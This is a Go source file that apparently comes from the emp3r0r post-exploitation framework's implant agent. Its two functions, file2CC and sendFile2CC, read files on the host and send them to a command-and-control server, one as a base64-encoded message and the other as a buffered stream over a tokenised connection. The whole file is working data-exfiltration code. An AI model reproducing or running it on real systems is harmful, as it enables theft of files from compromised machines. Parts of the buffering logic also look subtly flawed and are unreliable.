package agent

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// send local file to CC
func file2CC(filepath string, offset int64) (checksum string, err error) {
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		return
	}
	total := util.FileSize(filepath)
	bytes := make([]byte, total-offset)
	_, err = f.ReadAt(bytes, offset)
	if err != nil {
		return
	}
	checksum = tun.SHA256SumRaw(bytes)

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := MsgTunData{
		Payload: "FILE" + OpSep + filepath + OpSep + payload,
		Tag:     Tag,
	}

	// send
	return checksum, Send2CC(&fileData)
}

// sendFile2CC send file to CC, with buffering
func sendFile2CC(filepath string, offset int64, token string) (checksum string, err error) {
	log.Printf("Sending %s to CC, offset=%d", filepath, offset)
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: failed to open %s: %v", filepath, err)
		return
	}
	// seek offset
	_, err = f.Seek(offset, 0)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: failed to seek %d in %s: %v", offset, filepath, err)
		return
	}

	// connect
	url := CCAddress + tun.FTPAPI + "/" + token
	conn, ctx, cancel, err := ConnectCC(url)
	log.Printf("sendFile2CC: connection: %s", url)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: connection failed: %v", err)
		return
	}
	defer cancel()

	// read
	var (
		send = make(chan []byte, 1024)
		buf  = make([]byte, 1024)
	)
	go func() {
		for outgoing := range send {
			outgoing = bytes.Trim(outgoing, "\x00") // trim NULL
			select {
			case <-ctx.Done():
				return
			default:
				_, err = conn.Write(outgoing)
				if err != nil {
					log.Printf("conn write: %v", err)
					return
				}
			}
		}
	}()
	reader := bufio.NewReader(f)
	for ctx.Err() == nil {
		_, err = reader.Read(buf)
		if err != nil {
			return
		}
		send <- buf
	}

	// checksum
	go func() {
		checksum = tun.SHA256SumFile(filepath)
	}()
	for checksum == "" {
		time.Sleep(100 * time.Millisecond)
	}

	return
}
